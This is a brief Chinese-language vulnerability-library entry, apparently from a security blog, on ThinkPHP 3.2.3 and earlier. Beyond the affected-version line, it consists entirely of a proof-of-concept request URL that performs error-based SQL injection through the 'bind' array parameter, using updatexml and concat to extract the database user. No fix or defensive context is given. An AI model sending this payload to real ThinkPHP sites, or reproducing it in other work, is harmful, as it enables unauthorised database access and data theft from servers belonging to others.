---
title: 'Thinkphp'
date: Tue, 25 Aug 2020 15:50:26 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响范围

Thinkphp <= 3.2.3

### 漏洞验证POC

```
/index.php/home/user?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
```